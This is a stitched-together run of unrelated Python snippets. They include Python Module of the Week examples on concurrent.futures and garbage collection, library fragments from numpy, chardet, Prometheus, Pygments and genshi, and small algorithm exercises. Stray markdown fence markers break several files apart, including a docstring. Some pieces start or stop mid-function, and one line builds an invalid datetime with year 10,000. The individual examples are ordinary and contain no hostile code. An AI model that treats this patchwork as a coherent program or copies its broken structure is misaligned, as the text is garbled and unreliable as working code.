    @functools.wraps(f)
    def decorated(a="decorated defaults", b=1):
        print("  decorated:", (a, b))
        print("  ", end=" ")
        return f(a, b=b)

    return decorated


def myfunc(a, b=2):
    "myfunc() is not complicated"
    print("  myfunc:", (a, b))
    return


# The raw function
show_details("myfunc", myfunc)
myfunc("unwrapped, default b")
myfunc("unwrapped, passing b", 3)
print()

# Wrap explicitly
wrapped_myfunc = simple_decorator(myfunc)
show_details("wrapped_myfunc", wrapped_myfunc)
wrapped_myfunc()
wrapped_myfunc("args to wrapped", 4)
print()


# Wrap with decorator syntax
@simple_decorator
def decorated_myfunc(a, b):
    myfunc(a, b)
    return


show_details("decorated_myfunc", decorated_myfunc)
decorated_myfunc()
decorated_myfunc("args to decorated", 4)

from datetime import datetime

date = datetime(10_000, 1, 1)
print(f"The party started on {date:%B, %d %Y} and lasted a 10 days")

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRunning tasks in a managed group of threads.```


```py

# end_pymotw_header
from concurrent import futures
import random
import time


def task(n):
    time.sleep(random.random())
    return (n, n / 10)


ex = futures.ThreadPoolExecutor(max_workers=5)
print("main: starting")

wait_for = [ex.submit(task, i) for i in range(5, 0, -1)]

for f in futures.as_completed(wait_for):
    print("main: result: {}".format(f.result()))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRunning tasks in a managed group of threads.```


```py

# end_pymotw_header
from concurrent import futures


def task(n):
    print(n)


with futures.ThreadPoolExecutor(max_workers=2) as ex:
    print("main: starting")
    ex.submit(task, 1)
    ex.submit(task, 2)
    ex.submit(task, 3)
    ex.submit(task, 4)

print("main: done")

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyDone callbacks.```


```py

# end_pymotw_header
from concurrent import futures
import time


def task(n):
    print("{}: sleeping".format(n))
    time.sleep(0.5)
    print("{}: done".format(n))
    return n / 10


def done(fn):
    if fn.cancelled():
        print("{}: canceled".format(fn.arg))
    elif fn.done():
        error = fn.exception()
        if error:
            print("{}: error returned: {}".format(fn.arg, error))
        else:
            result = fn.result()
            print("{}: value returned: {}".format(fn.arg, result))


if __name__ == "__main__":
    ex = futures.ThreadPoolExecutor(max_workers=2)
    print("main: starting")
    f = ex.submit(task, 5)
    f.arg = 5
    f.add_done_callback(done)
    result = f.result()

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyDone callbacks.```


```py

# end_pymotw_header
from concurrent import futures
import time


def task(n):
    print("{}: sleeping".format(n))
    time.sleep(0.5)
    print("{}: done".format(n))
    return n / 10


def done(fn):
    if fn.cancelled():
        print("{}: canceled".format(fn.arg))
    elif fn.done():
        print("{}: not canceled".format(fn.arg))


if __name__ == "__main__":
    ex = futures.ThreadPoolExecutor(max_workers=2)
    print("main: starting")
    tasks = []

    for i in range(10, 0, -1):
        print("main: submitting {}".format(i))
        f = ex.submit(task, i)
        f.arg = i
        f.add_done_callback(done)
        tasks.append((i, f))

    for i, t in reversed(tasks):
        if not t.cancel():
            print("main: did not cancel {}".format(i))

    ex.shutdown()

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyDone callbacks.```


```py

# end_pymotw_header
from concurrent import futures


def task(n):
    print("{}: starting".format(n))
    raise ValueError("the value {} is no good".format(n))


ex = futures.ThreadPoolExecutor(max_workers=2)
print("main: starting")
f = ex.submit(task, 5)

error = f.exception()
print("main: error: {}".format(error))

try:
    result = f.result()
except ValueError as e:
    print('main: saw error "{}" when accessing result'.format(e))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyDetecting broken process pools.```


```py

# end_pymotw_header
from concurrent import futures
import os
import signal


with futures.ProcessPoolExecutor(max_workers=2) as ex:
    print("getting the pid for one worker")
    f1 = ex.submit(os.getpid)
    pid1 = f1.result()

    print("killing process {}".format(pid1))
    os.kill(pid1, signal.SIGHUP)

    print("submitting another task")
    f2 = ex.submit(os.getpid)
    try:
        pid2 = f2.result()
    except futures.process.BrokenProcessPool as e:
        print("could not start new tasks: {}".format(e))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRunning tasks in a managed group of processes.```


```py

# end_pymotw_header
from concurrent import futures
import os


def task(n):
    return (n, os.getpid())


ex = futures.ProcessPoolExecutor(max_workers=2)
results = ex.map(task, range(5, 0, -1))
for n, pid in results:
    print("ran task {} in process {}".format(n, pid))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRunning tasks in a managed group of threads.```


```py

# end_pymotw_header
from concurrent import futures
import threading
import time


def task(n):
    print("{}: sleeping {}".format(threading.current_thread().name, n))
    time.sleep(n / 10)
    print("{}: done with {}".format(threading.current_thread().name, n))
    return n / 10


ex = futures.ThreadPoolExecutor(max_workers=2)
print("main: starting")
results = ex.map(task, range(5, 0, -1))
print("main: unprocessed results {}".format(results))
print("main: waiting for real results")
real_results = list(results)
print("main: results: {}".format(real_results))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRunning tasks in a managed group of threads.```


```py

# end_pymotw_header
from concurrent import futures
import threading
import time


def task(n):
    print("{}: sleeping {}".format(threading.current_thread().name, n))
    time.sleep(n / 10)
    print("{}: done with {}".format(threading.current_thread().name, n))
    return n / 10


ex = futures.ThreadPoolExecutor(max_workers=2)
print("main: starting")
f = ex.submit(task, 5)
print("main: future: {}".format(f))
print("main: waiting for results")
result = f.result()
print("main: result: {}".format(result))
print("main: future after result: {}".format(f))

# http://g95.sourceforge.net/
from numpy.distutils.fcompiler import FCompiler

compilers = ["G95FCompiler"]


class G95FCompiler(FCompiler):
    compiler_type = "g95"
    description = "G95 Fortran Compiler"

    #    version_pattern = r'G95 \((GCC (?P<gccversion>[\d.]+)|.*?) \(g95!\) (?P<version>.*)\).*'
    # $ g95 --version
    # G95 (GCC 4.0.3 (g95!) May 22 2006)

    version_pattern = r"G95 \((GCC (?P<gccversion>[\d.]+)|.*?) \(g95 (?P<version>.*)!\) (?P<date>.*)\).*"
    # $ g95 --version
    # G95 (GCC 4.0.3 (g95 0.90!) Aug 22 2006)

    executables = {
        "version_cmd": ["<F90>", "--version"],
        "compiler_f77": ["g95", "-ffixed-form"],
        "compiler_fix": ["g95", "-ffixed-form"],
        "compiler_f90": ["g95"],
        "linker_so": ["<F90>", "-shared"],
        "archiver": ["ar", "-cr"],
        "ranlib": ["ranlib"],
    }
    pic_flags = ["-fpic"]
    module_dir_switch = "-fmod="
    module_include_switch = "-I"

    def get_flags(self):
        return ["-fno-second-underscore"]

    def get_flags_opt(self):
        return ["-O"]

    def get_flags_debug(self):
        return ["-g"]


if __name__ == "__main__":
    from distutils import log
    from numpy.distutils import customized_fcompiler

    log.set_verbosity(2)
    print(customized_fcompiler("g95").get_version())

# Author: Phyllipe Bezerra (https://github.com/pmba)

clothes = {
    0: "underwear",
    1: "pants",
    2: "belt",
    3: "suit",
    4: "shoe",
    5: "socks",
    6: "shirt",
    7: "tie",
    8: "watch",
}

graph = [[1, 4], [2, 4], [3], [], [], [4], [2, 7], [3], []]

visited = [0 for x in range(len(graph))]
stack = []


def print_stack(stack, clothes):
    order = 1
    while stack:
        current_clothing = stack.pop()
        print(order, clothes[current_clothing])
        order += 1


def depth_first_search(u, visited, graph):
    visited[u] = 1
    for v in graph[u]:
        if not visited[v]:
            depth_first_search(v, visited, graph)

    stack.append(u)


def topological_sort(graph, visited):
    for v in range(len(graph)):
        if not visited[v]:
            depth_first_search(v, visited, graph)


if __name__ == "__main__":
    topological_sort(graph, visited)
    print(stack)
    print_stack(stack, clothes)

from __future__ import annotations


def stable_matching(
    donor_pref: list[list[int]], recipient_pref: list[list[int]]
) -> list[int]:
    """
    Finds the stable match in any bipartite graph, i.e a pairing where no 2 objects
    prefer each other over their partner.  The function accepts the preferences of
    oegan donors and recipients (where both are assigned numbers from 0 to n-1) and
    returns a list where the index position corresponds to the donor and value at the
    index is the organ recipient.

    To better understand the algorithm, see also:
    https://github.com/akashvshroff/Gale_Shapley_Stable_Matching (README).
    https://www.youtube.com/watch?v=Qcv1IqHWAzg&t=13s (Numberphile YouTube).

    >>> donor_pref = [[0, 1, 3, 2], [0, 2, 3, 1], [1, 0, 2, 3], [0, 3, 1, 2]]
    >>> recipient_pref = [[3, 1, 2, 0], [3, 1, 0, 2], [0, 3, 1, 2], [1, 0, 3, 2]]
    >>> print(stable_matching(donor_pref, recipient_pref))
    [1, 2, 3, 0]
    """
    assert len(donor_pref) == len(recipient_pref)

    n = len(donor_pref)
    unmatched_donors = list(range(n))
    donor_record = [-1] * n  # who the donor has donated to
    rec_record = [-1] * n  # who the recipient has received from
    num_donations = [0] * n

    while unmatched_donors:
        donor = unmatched_donors[0]
        donor_preference = donor_pref[donor]
        recipient = donor_preference[num_donations[donor]]
        num_donations[donor] += 1
        rec_preference = recipient_pref[recipient]
        prev_donor = rec_record[recipient]

        if prev_donor != -1:
            if rec_preference.index(prev_donor) > rec_preference.index(donor):
                rec_record[recipient] = donor
                donor_record[donor] = recipient
                unmatched_donors.append(prev_donor)
                unmatched_donors.remove(donor)
        else:
            rec_record[recipient] = donor
            donor_record[donor] = recipient
            unmatched_donors.remove(donor)
    return donor_record

from day4 import Player, Room, Item

running = True
player = Player()


def move(player, direction):
    player.move(direction)


# REPL === Parser
while running:
    cmd = input(">>> ")
    # split the cmd in to commands

    # if commands length is 1
    if cmd in ["n", "s", "e", "w"]:
        move(player, cmd)

    # if commands length is 2
    # get, drop

import math

from numpy import inf
from scipy.integrate import quad


def gamma(num: float) -> float:
    """
    https://en.wikipedia.org/wiki/Gamma_function
    In mathematics, the gamma function is one commonly
    used extension of the factorial function to complex numbers.
    The gamma function is defined for all complex numbers except the non-positive
    integers


    >>> gamma(-1)
    Traceback (most recent call last):
        ...
    ValueError: math domain error



    >>> gamma(0)
    Traceback (most recent call last):
        ...
    ValueError: math domain error


    >>> gamma(9)
    40320.0

    >>> from math import gamma as math_gamma
    >>> all(.99999999 < gamma(i) / math_gamma(i) <= 1.000000001
    ...     for i in range(1, 50))
    True


    >>> from math import gamma as math_gamma
    >>> gamma(-1)/math_gamma(-1) <= 1.000000001
    Traceback (most recent call last):
        ...
    ValueError: math domain error


    >>> from math import gamma as math_gamma
    >>> gamma(3.3) - math_gamma(3.3) <= 0.00000001
    True
    """

    if num <= 0:
        raise ValueError("math domain error")

    return quad(integrand, 0, inf, args=(num))[0]


def integrand(x: float, z: float) -> float:
    return math.pow(x, z - 1) * math.exp(-x)


if __name__ == "__main__":
    from doctest import testmod

    testmod()

# def gasPrediction(driveDistances, currentGasLevel, avgMileage):
#     a = sum(driveDistances) / 12 / avgMileage
#     print(a)
#     if a > currentGasLevel:
#         return True
#     else:
#         return False

# d, c, a = eval(dir()[0])
# return sum(d) / 12 / a > c

# 39 chars
gasPrediction = lambda d, c, a: sum(d) / 12 / a > c
````

````py
https://en.wikipedia.org/wiki/Computus#Gauss'_Easter_algorithm```


```py
import math
from datetime import datetime, timedelta


def gauss_easter(year: int) -> datetime:
    """
    Calculation Gregorian easter date for given year

    >>> gauss_easter(2007)
    datetime.datetime(2007, 4, 8, 0, 0)

    >>> gauss_easter(2008)
    datetime.datetime(2008, 3, 23, 0, 0)

    >>> gauss_easter(2020)
    datetime.datetime(2020, 4, 12, 0, 0)

    >>> gauss_easter(2021)
    datetime.datetime(2021, 4, 4, 0, 0)
    """
    metonic_cycle = year % 19
    julian_leap_year = year % 4
    non_leap_year = year % 7
    leap_day_inhibits = math.floor(year / 100)
    lunar_orbit_correction = math.floor((13 + 8 * leap_day_inhibits) / 25)
    leap_day_reinstall_number = leap_day_inhibits / 4
    secular_moon_shift = (
        15 - lunar_orbit_correction + leap_day_inhibits - leap_day_reinstall_number
    ) % 30
    century_starting_point = (4 + leap_day_inhibits - leap_day_reinstall_number) % 7

    # days to be added to March 21
    days_to_add = (19 * metonic_cycle + secular_moon_shift) % 30

    # PHM -> Paschal Full Moon
    days_from_phm_to_sunday = (
        2 * julian_leap_year
        + 4 * non_leap_year
        + 6 * days_to_add
        + century_starting_point
    ) % 7

    if days_to_add == 29 and days_from_phm_to_sunday == 6:
        return datetime(year, 4, 19)
    elif days_to_add == 28 and days_from_phm_to_sunday == 6:
        return datetime(year, 4, 18)
    else:
        return datetime(year, 3, 22) + timedelta(
            days=int(days_to_add + days_from_phm_to_sunday)
        )


if __name__ == "__main__":
    for year in (1994, 2000, 2010, 2021, 2023):
        tense = "will be" if year > datetime.now().year else "was"
        print(f"Easter in {year} {tense} {gauss_easter(year)}")
````

````py
Reference: https://en.wikipedia.org/wiki/Gaussian_function```


```py
from numpy import exp, pi, sqrt


def gaussian(x, mu: float = 0.0, sigma: float = 1.0) -> int:
    """
    >>> gaussian(1)
    0.24197072451914337

    >>> gaussian(24)
    3.342714441794458e-126

    >>> gaussian(1, 4, 2)
    0.06475879783294587

    >>> gaussian(1, 5, 3)
    0.05467002489199788

    Supports NumPy Arrays
    Use numpy.meshgrid with this to generate gaussian blur on images.
    >>> import numpy as np
    >>> x = np.arange(15)
    >>> gaussian(x)
    array([3.98942280e-01, 2.41970725e-01, 5.39909665e-02, 4.43184841e-03,
           1.33830226e-04, 1.48671951e-06, 6.07588285e-09, 9.13472041e-12,
           5.05227108e-15, 1.02797736e-18, 7.69459863e-23, 2.11881925e-27,
           2.14638374e-32, 7.99882776e-38, 1.09660656e-43])

    >>> gaussian(15)
    5.530709549844416e-50

    >>> gaussian([1,2, 'string'])
    Traceback (most recent call last):
        ...
    TypeError: unsupported operand type(s) for -: 'list' and 'float'

    >>> gaussian('hello world')
    Traceback (most recent call last):
        ...
    TypeError: unsupported operand type(s) for -: 'str' and 'float'

    >>> gaussian(10**234) # doctest: +IGNORE_EXCEPTION_DETAIL
    Traceback (most recent call last):
        ...
    OverflowError: (34, 'Result too large')

    >>> gaussian(10**-326)
    0.3989422804014327

    >>> gaussian(2523, mu=234234, sigma=3425)
    0.0
    """
    return 1 / sqrt(2 * pi * sigma ** 2) * exp(-((x - mu) ** 2) / (2 * sigma ** 2))


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Implementation of gaussian filter algorithm```


```py
from itertools import product

from cv2 import COLOR_BGR2GRAY, cvtColor, imread, imshow, waitKey
from numpy import dot, exp, mgrid, pi, ravel, square, uint8, zeros


def gen_gaussian_kernel(k_size, sigma):
    center = k_size // 2
    x, y = mgrid[0 - center : k_size - center, 0 - center : k_size - center]
    g = 1 / (2 * pi * sigma) * exp(-(square(x) + square(y)) / (2 * square(sigma)))
    return g


def gaussian_filter(image, k_size, sigma):
    height, width = image.shape[0], image.shape[1]
    # dst image height and width
    dst_height = height - k_size + 1
    dst_width = width - k_size + 1

    # im2col, turn the k_size*k_size pixels into a row and np.vstack all rows
    image_array = zeros((dst_height * dst_width, k_size * k_size))
    row = 0
    for i, j in product(range(dst_height), range(dst_width)):
        window = ravel(image[i : i + k_size, j : j + k_size])
        image_array[row, :] = window
        row += 1

    #  turn the kernel into shape(k*k, 1)
    gaussian_kernel = gen_gaussian_kernel(k_size, sigma)
    filter_array = ravel(gaussian_kernel)

    # reshape and get the dst image
    dst = dot(image_array, filter_array).reshape(dst_height, dst_width).astype(uint8)

    return dst


if __name__ == "__main__":
    # read original image
    img = imread(r"../image_data/lena.jpg")
    # turn image in gray scale value
    gray = cvtColor(img, COLOR_BGR2GRAY)

    # get values with two different mask size
    gaussian3x3 = gaussian_filter(gray, 3, sigma=1)
    gaussian5x5 = gaussian_filter(gray, 5, sigma=0.8)

    # show result images
    imshow("gaussian filter with 3x3 mask", gaussian3x3)
    imshow("gaussian filter with 5x5 mask", gaussian5x5)
    waitKey()

# Gaussian Naive Bayes Example
from matplotlib import pyplot as plt
from sklearn.datasets import load_iris
from sklearn.metrics import plot_confusion_matrix
from sklearn.model_selection import train_test_split
from sklearn.naive_bayes import GaussianNB


def main():

    """
    Gaussian Naive Bayes Example using sklearn function.
    Iris type dataset is used to demonstrate algorithm.
    """

    # Load Iris dataset
    iris = load_iris()

    # Split dataset into train and test data
    X = iris["data"]  # features
    Y = iris["target"]
    x_train, x_test, y_train, y_test = train_test_split(
        X, Y, test_size=0.3, random_state=1
    )

    # Gaussian Naive Bayes
    NB_model = GaussianNB()
    NB_model.fit(x_train, y_train)

    # Display Confusion Matrix
    plot_confusion_matrix(
        NB_model,
        x_test,
        y_test,
        display_labels=iris["target_names"],
        cmap="Blues",
        normalize="true",
    )
    plt.title("Normalized Confusion Matrix - IRIS Dataset")
    plt.show()


if __name__ == "__main__":
    main()

######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import GB2312DistributionAnalysis
from .mbcssm import GB2312_SM_MODEL


class GB2312Prober(MultiByteCharSetProber):
    def __init__(self):
        super(GB2312Prober, self).__init__()
        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)
        self.distribution_analyzer = GB2312DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return "GB2312"

    @property
    def language(self):
        return "Chinese"

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the objects with references to a given object.```


```py

# end_pymotw_header
import gc
import pprint


class Graph:
    def __init__(self, name):
        self.name = name
        self.next = None

    def set_next(self, next):
        print("Linking nodes {}.next = {}".format(self, next))
        self.next = next

    def __repr__(self):
        return "{}({})".format(self.__class__.__name__, self.name)


# Construct a graph cycle
one = Graph("one")
two = Graph("two")
three = Graph("three")
one.set_next(two)
two.set_next(three)
three.set_next(one)

# Remove references to the graph nodes in this module's namespace
one = two = three = None

# Show the effect of garbage collection
for i in range(2):
    print("\nCollecting {} ...".format(i))
    n = gc.collect()
    print("Unreachable objects:", n)
    print("Remaining Garbage:", end=" ")
    pprint.pprint(gc.garbage)

from __future__ import unicode_literals

import gc
import platform

from .metrics_core import CounterMetricFamily
from .registry import REGISTRY


class GCCollector(object):
    """Collector for Garbage collection statistics."""

    def __init__(self, registry=REGISTRY):
        if (
            not hasattr(gc, "get_stats")
            or platform.python_implementation() != "CPython"
        ):
            return
        registry.register(self)

    def collect(self):
        collected = CounterMetricFamily(
            "python_gc_objects_collected",
            "Objects collected during gc",
            labels=["generation"],
        )
        uncollectable = CounterMetricFamily(
            "python_gc_objects_uncollectable",
            "Uncollectable object found during GC",
            labels=["generation"],
        )

        collections = CounterMetricFamily(
            "python_gc_collections",
            "Number of times this generation was collected",
            labels=["generation"],
        )

        for generation, stat in enumerate(gc.get_stats()):
            generation = str(generation)
            collected.add_metric([generation], value=stat["collected"])
            uncollectable.add_metric([generation], value=stat["uncollectable"])
            collections.add_metric([generation], value=stat["collections"])

        return [collected, uncollectable, collections]


GC_COLLECTOR = GCCollector()```


```pyDefault GCCollector in default Registry REGISTRY."""

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the objects with references to a given object.```


```py

# end_pymotw_header
import gc

flags = gc.DEBUG_LEAK

gc.set_debug(flags)


class Graph:
    def __init__(self, name):
        self.name = name
        self.next = None

    def set_next(self, next):
        self.next = next

    def __repr__(self):
        return "{}({})".format(self.__class__.__name__, self.name)


class CleanupGraph(Graph):
    def __del__(self):
        print("{}.__del__()".format(self))


# Construct a graph cycle
one = Graph("one")
two = Graph("two")
one.set_next(two)
two.set_next(one)

# Construct another node that stands on its own
three = CleanupGraph("three")

# Construct a graph cycle with a finalizer
four = CleanupGraph("four")
five = CleanupGraph("five")
four.set_next(five)
five.set_next(four)

# Remove references to the graph nodes in this module's namespace
one = two = three = four = five = None

# Force a sweep
print("Collecting")
gc.collect()
print("Done")

# Report on what was left
for o in gc.garbage:
    if isinstance(o, Graph):
        print("Retained: {} 0x{:x}".format(o, id(o)))

# Reset the debug flags before exiting to avoid dumping a lot
# of extra information and making the example output more
# confusing.
gc.set_debug(0)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the objects with references to a given object.```


```py

# end_pymotw_header
import gc

flags = gc.DEBUG_COLLECTABLE | gc.DEBUG_UNCOLLECTABLE | gc.DEBUG_SAVEALL

gc.set_debug(flags)


class Graph:
    def __init__(self, name):
        self.name = name
        self.next = None

    def set_next(self, next):
        self.next = next

    def __repr__(self):
        return "{}({})".format(self.__class__.__name__, self.name)


class CleanupGraph(Graph):
    def __del__(self):
        print("{}.__del__()".format(self))


# Construct a graph cycle
one = Graph("one")
two = Graph("two")
one.set_next(two)
two.set_next(one)

# Construct another node that stands on its own
three = CleanupGraph("three")

# Construct a graph cycle with a finalizer
four = CleanupGraph("four")
five = CleanupGraph("five")
four.set_next(five)
five.set_next(four)

# Remove references to the graph nodes in this module's namespace
one = two = three = four = five = None

# Force a sweep
print("Collecting")
gc.collect()
print("Done")

# Report on what was left
for o in gc.garbage:
    if isinstance(o, Graph):
        print("Retained: {} 0x{:x}".format(o, id(o)))

# Reset the debug flags before exiting to avoid dumping a lot
# of extra information and making the example output more
# confusing.
gc.set_debug(0)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTuning the garbage collector threshold.```


```py

# end_pymotw_header
import gc

gc.set_debug(gc.DEBUG_STATS)

gc.collect()
print("Exiting")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExamine the objects being managed.```


```py

# end_pymotw_header
import gc

print(len(gc.get_objects()))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the objects with references to a given object.```


```py

# end_pymotw_header
import gc
import pprint


class Graph:
    def __init__(self, name):
        self.name = name
        self.next = None

    def set_next(self, next):
        print("Linking nodes {}.next = {}".format(self, next))
        self.next = next

    def __repr__(self):
        return "{}({})".format(self.__class__.__name__, self.name)


# Construct a graph cycle
one = Graph("one")
two = Graph("two")
three = Graph("three")
one.set_next(two)
two.set_next(three)
three.set_next(one)

print()
print("three refers to:")
for r in gc.get_referents(three):
    pprint.pprint(r)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the objects with references to a given object.```


```py

# end_pymotw_header
import gc
import pprint
import queue


class Graph:
    def __init__(self, name):
        self.name = name
        self.next = None

    def set_next(self, next):
        print("Linking nodes {}.next = {}".format(self, next))
        self.next = next

    def __repr__(self):
        return "{}({})".format(self.__class__.__name__, self.name)


# Construct a graph cycle
one = Graph("one")
two = Graph("two")
three = Graph("three")
one.set_next(two)
two.set_next(three)
three.set_next(one)

print()

seen = set()
to_process = queue.Queue()

# Start with an empty object chain and Graph three.
to_process.put(([], three))

# Look for cycles, building the object chain for each object
# found in the queue so the full cycle can be printed at the
# end.
while not to_process.empty():
    chain, next = to_process.get()
    chain = chain[:]
    chain.append(next)
    print("Examining:", repr(next))
    seen.add(id(next))
    for r in gc.get_referents(next):
        if isinstance(r, str) or isinstance(r, type):
            # Ignore strings and classes
            pass
        elif id(r) in seen:
            print()
            print("Found a cycle to {}:".format(r))
            for i, link in enumerate(chain):
                print("  {}: ".format(i), end=" ")
                pprint.pprint(link)
        else:
            to_process.put((chain, r))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the objects with references to a given object.```


```py

# end_pymotw_header
import gc
import pprint


class Graph:
    def __init__(self, name):
        self.name = name
        self.next = None

    def set_next(self, next):
        print("Linking nodes {}.next = {}".format(self, next))
        self.next = next

    def __repr__(self):
        return "{}({})".format(self.__class__.__name__, self.name)

    def __del__(self):
        print("{}.__del__()".format(self))


# Construct a graph cycle
one = Graph("one")
two = Graph("two")
three = Graph("three")
one.set_next(two)
two.set_next(three)
three.set_next(one)

# Collecting now keeps the objects as uncollectable,
# but not garbage.
print()
print("Collecting...")
n = gc.collect()
print("Unreachable objects:", n)
print("Remaining Garbage:", end=" ")
pprint.pprint(gc.garbage)

# Ignore references from local variables in this module, global
# variables, and from the garbage collector's bookkeeping.
REFERRERS_TO_IGNORE = [locals(), globals(), gc.garbage]


def find_referring_graphs(obj):
    print("Looking for references to {!r}".format(obj))
    referrers = (r for r in gc.get_referrers(obj) if r not in REFERRERS_TO_IGNORE)
    for ref in referrers:
        if isinstance(ref, Graph):
            # A graph node
            yield ref
        elif isinstance(ref, dict):
            # An instance or other namespace dictionary
            for parent in find_referring_graphs(ref):
                yield parent


# Look for objects that refer to the objects in the graph.
print()
print("Clearing referrers:")
for obj in [one, two, three]:
    for ref in find_referring_graphs(obj):
        print("Found referrer:", ref)
        ref.set_next(None)
        del ref  # remove reference so the node can be deleted
    del obj  # remove reference so the node can be deleted

# Clear references held by gc.garbage
print()
print("Clearing gc.garbage:")
del gc.garbage[:]

# Everything should have been freed this time
print()
print("Collecting...")
n = gc.collect()
print("Unreachable objects:", n)
print("Remaining Garbage:", end=" ")
pprint.pprint(gc.garbage)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyShow the default thresholds.```


```py

# end_pymotw_header
import gc

print(gc.get_threshold())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTuning the garbage collector threshold.```


```py

# end_pymotw_header
import gc
import pprint
import sys

try:
    threshold = int(sys.argv[1])
except (IndexError, ValueError, TypeError):
    print("Missing or invalid threshold, using default")
    threshold = 5


class MyObj:
    def __init__(self, name):
        self.name = name
        print("Created", self.name)


gc.set_debug(gc.DEBUG_STATS)

gc.set_threshold(threshold, 1, 1)
print("Thresholds:", gc.get_threshold())

print("Clear the collector by forcing a run")
gc.collect()
print()

print("Creating objects")
objs = []
for i in range(10):
    objs.append(MyObj(i))
print("Exiting")

# Turn off debugging
gc.set_debug(0)

# -*- coding: utf-8 -*-```


```py
    pygments.lexers.gcodelexer
    ~~~~~~~~~~~~~~~~~~~~~~~~~~

    Lexers for the G Code Language.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Comment, Name, Text, Keyword, Number

__all__ = ["GcodeLexer"]


class GcodeLexer(RegexLexer):
    """
    For gcode source code.

    .. versionadded:: 2.9
    """

    name = "g-code"
    aliases = ["gcode"]
    filenames = ["*.gcode"]

    tokens = {
        "root": [
            (r";.*\n", Comment),
            (r"^[gmGM]\d{1,4}\s", Name.Builtin),  # M or G commands
            (r"([^gGmM])([+-]?\d*[.]?\d+)", bygroups(Keyword, Number)),
            (r"\s", Text.Whitespace),
            (r".*\n", Text),
        ]
    }
````

Generate Parentheses

Given n pairs of parentheses, write a function to generate all combinations of well-formed parentheses.

Input: 3
Output:
        [
            '((()))',
            '(()())',
            '(())()',
            '()(())',
            '()()()'
        ]

=========================================
This problem could be solved in several ways (using stack, queue, or just a simple list - see letter_combinations.py), all of them have the same complexity.
I'll solve it using simple recursive algorithm.
    Time Complexity:    O(4^N)      , O(2^(2*N)) = O(4^N)
    Space Complexity:   O(4^N)```


```py


############
# Solution #
############


def generate_parentheses(n):
    result = []
    if n == 0:
        return result

    combinations(result, n, n, "")

    return result


def combinations(result, open_left, close_left, combination):
    if close_left == 0:
        # a new combination is created (no more open or close parentheses)
        result.append(combination)
    elif open_left == 0:
        # no more open parentheses, so all left parentheses must be closed (just add the missing close parentheses)
        result.append(combination + (")" * close_left))
    else:
        combinations(result, open_left - 1, close_left, combination + "(")

        # check if there is a pair for this close parenthesis
        if open_left < close_left:
            combinations(result, open_left, close_left - 1, combination + ")")


###########
# Testing #
###########

# Test 1
# Correct result => ['((()))', '(()())', '(())()', '()(())', '()()()']
print(generate_parentheses(3))
````

Fibonacci implementation through generator.```


```py
import inspect


def get_sequence(n):
    """
    Return Fibonacci sequence from zero to specified number as list.
    """

    def fib():
        """
        Return Fibonacci value by specified number as integer.

        Golden ratio — https://en.wikipedia.org/wiki/Golden_ratio
        Fibonacci's relation to the golden ratio — https://en.wikipedia.org/wiki/Fibonacci_number#Closed-form_expression
        """
        a, b = 0, 1
        while True:
            yield a
            a, b = b, a + b

    def sequence(_n):
        """
        Return sequence of Fibonacci values as list.
        """
        f = fib()
        return [f.__next__() for _ in range(_n + 1)]

    return sequence(n)


def get_code():
    """
    Return source code of Fibonacci sequence logic's implementation.
    """
    return inspect.getsource(get_sequence)

class Heap:
    def __init__(self, comparator):
        self.storage = []
        self.comparator = comparator

    def insert(self, value):
        pass

    def delete(self):
        pass

    def get_priority(self):
        pass

    def get_size(self):
        pass

    def _bubble_up(self, index):
        pass

    def _sift_down(self, index):
        pass

from __future__ import absolute_import, division, unicode_literals

from genshi.core import QName, Attrs
from genshi.core import START, END, TEXT, COMMENT, DOCTYPE


def to_genshi(walker):
    """Convert a tree to a genshi tree

    :arg walker: the treewalker to use to walk the tree to convert it

    :returns: generator of genshi nodes

    """
    text = []
    for token in walker:
        type = token["type"]
        if type in ("Characters", "SpaceCharacters"):
            text.append(token["data"])
        elif text:
